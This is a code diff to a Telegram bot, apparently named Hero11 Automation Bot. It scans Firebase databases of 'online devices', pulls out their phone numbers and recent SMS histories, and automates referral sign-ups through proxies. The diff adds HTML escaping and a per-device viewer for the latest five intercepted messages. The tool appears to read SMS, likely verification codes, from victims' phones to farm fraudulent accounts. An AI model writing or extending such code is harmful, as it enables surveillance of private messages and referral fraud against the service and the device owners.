@@ -7,6 +7,7 @@ import uuid
 import random
 import json
 import gc
+import html
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -383,7 +384,7 @@ class LiveLogger:
         now = time.time()
         if force or (now - self.last_update > 1.0):
             try:
-                await self.message.edit_text(f"<code>{text}</code>", parse_mode="HTML", reply_markup=get_main_menu())
+                await self.message.edit_text(f"<code>{html.escape(text)}</code>", parse_mode="HTML", reply_markup=get_main_menu())
                 self.last_update = time.time()
                 self.last_text = text
             except Exception:
@@ -398,7 +399,7 @@ async def cmd_start(message: types.Message, state: FSMContext):
     text = (
         "👋 <b>Welcome Admin to Hero11 Automation Bot!</b>\n\n"
         f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
-        f"📝 <b>Active Refer Code (Max 1):</b> <code>{current_code}</code>\n"
+        f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
         f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n\n"
         "Select an option below:"
     )
@@ -459,7 +460,7 @@ async def process_codes_input(message: types.Message, state: FSMContext):
         return
     USER_DATA["codes"] = [code]
     await state.clear()
-    await message.answer(f"✅ Active Refer Code set to: <code>{code}</code> (Strictly 1 code max)", parse_mode="HTML", reply_markup=get_main_menu())
+    await message.answer(f"✅ Active Refer Code set to: <code>{html.escape(code)}</code> (Strictly 1 code max)", parse_mode="HTML", reply_markup=get_main_menu())
 
 @dp.callback_query(F.data == "add_proxies")
 async def cb_add_proxies(callback: types.CallbackQuery, state: FSMContext):
@@ -507,7 +508,7 @@ async def cb_check_devices(callback: types.CallbackQuery):
                     pass
         await callback.message.answer(f"🟢 <b>Total Exact Online Devices Count Across All DBs:</b> {total_online_count}", parse_mode="HTML", reply_markup=get_main_menu())
     except Exception as e:
-        await callback.message.answer(f"❌ Error checking devices: {e}", reply_markup=get_main_menu())
+        await callback.message.answer(f"❌ Error checking devices: {html.escape(str(e))}", reply_markup=get_main_menu())
     await callback.answer()
 
 @dp.callback_query(F.data == "check_numbers_menu")
@@ -546,14 +547,14 @@ async def process_check_numbers_input(message: types.Message, state: FSMContext)
             try:
                 check_res = await client.black_check()
                 if check_res == "SKIP_EXISTS":
-                    results.append(f"• <code>{phone_num}</code>: 🔴 <b>Already Registered</b>")
+                    results.append(f"• <code>{html.escape(phone_num)}</code>: 🔴 <b>Already Registered</b>")
                 else:
-                    results.append(f"• <code>{phone_num}</code>: 🟢 <b>Unregistered / Available</b>")
+                    results.append(f"• <code>{html.escape(phone_num)}</code>: 🟢 <b>Unregistered / Available</b>")
             except Exception:
-                results.append(f"• <code>{phone_num}</code>: ⚠️ Error checking")
+                results.append(f"• <code>{html.escape(phone_num)}</code>: ⚠️ Error checking")
             await client.close()
         else:
-            results.append(f"• <code>{line}</code>: ❌ Invalid Number format")
+            results.append(f"• <code>{html.escape(line)}</code>: ❌ Invalid Number format")
 
     await state.clear()
     report_str = "\n".join(results)
@@ -571,11 +572,11 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
         await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
         return
 
-    status_msg = await callback.message.answer("🔍 Scanning online unregistered devices and fetching their top 5 recent SMS histories...")
+    status_msg = await callback.message.answer("🔍 Scanning online unregistered devices across all databases...")
     
     try:
         import aiohttp
-        report_lines = []
+        active_devices = []
         default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
         
         async with aiohttp.ClientSession() as session:
@@ -593,48 +594,110 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
                                     phone = extract_phone(msgs) if msgs else None
                                     if phone:
                                         full_phone = "+91" + phone
-                                        # Check if unregistered
                                         client = AsyncHero11Client(full_phone, default_code)
                                         check_res = await client.black_check()
                                         await client.close()
                                         
                                         if check_res != "SKIP_EXISTS":
-                                            # Unregistered active device found! Collect top recent SMS
-                                            sms_list = []
-                                            if isinstance(msgs, dict):
-                                                for m_key, m_val in list(msgs.items())[-5:]:
-                                                    if isinstance(m_val, dict):
-                                                        time_str = str(m_val.get("time") or m_val.get("timestamp") or "N/A")
-                                                        body_str = str(m_val.get("body") or m_val.get("message") or "N/A")
-                                                        sms_list.append(f"   [{time_str}] {body_str}")
-                                            
-                                            sms_block = "\n".join(sms_list) if sms_list else "   <i>No messages found</i>"
-                                            report_lines.append(
-                                                f"📱 <b>Phone:</b> <code>{full_phone}</code>\n"
-                                                f"🆔 <b>Device ID (CID):</b> <code>{cid}</code>\n"
-                                                f"📂 <b>DB:</b> {db_short_id}\n"
-                                                f"💬 <b>Top Recent SMS:</b>\n{sms_block}\n"
-                                                f"-----------------------------------"
-                                            )
+                                            active_devices.append({
+                                                "phone": full_phone,
+                                                "cid": cid,
+                                                "db_url": fb_url,
+                                                "db_short": db_short_id
+                                            })
                             except Exception:
                                 pass
                 except Exception:
                     pass
 
-        if not report_lines:
-            await status_msg.edit_text("ℹ️ No active unregistered online devices found across loaded databases.", reply_markup=get_main_menu())
-        else:
-            # Chunk long reports if needed
-            full_report = "\n".join(report_lines)
-            if len(full_report) > 4000:
-                full_report = full_report[:4000] + "\n\n<i>[Truncated due to length]</i>"
-            await status_msg.edit_text(
-                f"📋 <b>Active Unregistered Devices & SMS History:</b>\n\n{full_report}",
-                parse_mode="HTML",
-                reply_markup=get_main_menu()
-            )
+        if not active_devices:
+            await status_msg.edit_text("ℹ️ No active unregistered online devices found.", reply_markup=get_main_menu())
+            await callback.answer()
+            return
+
+        # Build inline keyboard buttons for each active unregistered device
+        keyboard_buttons = []
+        for dev in active_devices:
+            btn_text = f"📱 {dev['phone']} (DB: {dev['db_short']})"
+            # Callback data format: sms_<db_short>_<cid>
+            # To avoid length limits, we store mapping or encode safely
+            callback_data_str = f"sms_{dev['db_short']}_{dev['cid'][:15]}"
+            keyboard_buttons.append([InlineKeyboardButton(text=btn_text, callback_data=callback_data_str)])
+
+        # Keep temporary reference in memory for button lookup
+        USER_DATA["temp_active_devices"] = {f"sms_{dev['db_short']}_{dev['cid'][:15]}": dev for dev in active_devices}
+
+        markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
+        await status_msg.edit_text(
+            f"📋 <b>Found {len(active_devices)} Unregistered Active Device(s).</b>\n"
+            "Click any phone number below to view its live top 5 recent message history:",
+            parse_mode="HTML",
+            reply_markup=markup
+        )
     except Exception as e:
-        await status_msg.edit_text(f"❌ Error fetching active device SMS: {e}", reply_markup=get_main_menu())
+        await status_msg.edit_text(f"❌ Error scanning active devices: {html.escape(str(e))}", reply_markup=get_main_menu())
+    await callback.answer()
+
+@dp.callback_query(F.data.startswith("sms_"))
+async def cb_show_device_sms(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return
+    
+    dev_map = USER_DATA.get("temp_active_devices", {})
+    dev_info = dev_map.get(callback.data)
+    
+    if not dev_info:
+        await callback.answer("⚠️ Session expired or device list refreshed. Please click View Active Devices again.", show_alert=True)
+        return
+
+    await callback.answer("Fetching live SMS history...")
+    try:
+        import aiohttp
+        fb_url = dev_info["db_url"]
+        cid = dev_info["cid"]
+        phone = dev_info["phone"]
+        db_short = dev_info["db_short"]
+
+        sms_list = []
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=5', timeout=5) as m_req:
+                msgs = await m_req.json()
+                if isinstance(msgs, dict):
+                    for m_key, m_val in msgs.items():
+                        if isinstance(m_val, dict):
+                            time_str = str(m_val.get("time") or m_val.get("timestamp") or "N/A")
+                            body_str = str(m_val.get("body") or m_val.get("message") or "N/A")
+                            sms_list.append(f"• <b>[{html.escape(time_str)}]</b> {html.escape(body_str)}")
+
+        sms_block = "\n".join(sms_list) if sms_list else "<i>No messages found</i>"
+        detail_text = (
+            f"📱 <b>Phone:</b> <code>{html.escape(phone)}</code>\n"
+            f"🆔 <b>Device ID (CID):</b> <code>{html.escape(cid)}</code>\n"
+            f"📂 <b>Database:</b> {html.escape(db_short)}\n\n"
+            f"💬 <b>Top 5 Most Recent SMS History:</b>\n{sms_block}"
+        )
+
+        back_markup = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⬅️ Back to Active Devices", callback_data="view_active_sms")],
+            [InlineKeyboardButton(text="🏠 Main Menu", callback_data="back_to_main")]
+        ])
+        await callback.message.edit_text(detail_text, parse_mode="HTML", reply_markup=back_markup)
+    except Exception as e:
+        await callback.message.edit_text(f"❌ Error fetching SMS history: {html.escape(str(e))}", reply_markup=get_main_menu())
+
+@dp.callback_query(F.data == "back_to_main")
+async def cb_back_to_main(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return
+    current_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "Not Set ❌"
+    text = (
+        "👋 <b>Welcome Admin to Hero11 Automation Bot!</b>\n\n"
+        f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
+        f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
+        f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n\n"
+        "Select an option below:"
+    )
+    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_main_menu())
     await callback.answer()
 
 @dp.callback_query(F.data == "check_proxies")
@@ -830,7 +893,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
 
             USER_DATA["is_running"] = False
             if success_count >= total_needed:
-                numbers_list_str = "\n".join([f"• <code>{num}</code>" for num in registered_numbers])
+                numbers_list_str = "\n".join([f"• <code>{html.escape(num)}</code>" for num in registered_numbers])
                 final_msg = (
                     f"🎉 <b>HERO11 REGISTRATION COMPLETED!</b> 🎉\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -846,7 +909,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
             USER_DATA["is_running"] = False
         except Exception as e:
             USER_DATA["is_running"] = False
-            await callback.message.answer(f"❌ Error in automation loop: {e}", reply_markup=get_main_menu())
+            await callback.message.answer(f"❌ Error in automation loop: {html.escape(str(e))}", reply_markup=get_main_menu())
 
     USER_DATA["current_task"] = asyncio.create_task(run_automation())
     await callback.answer()
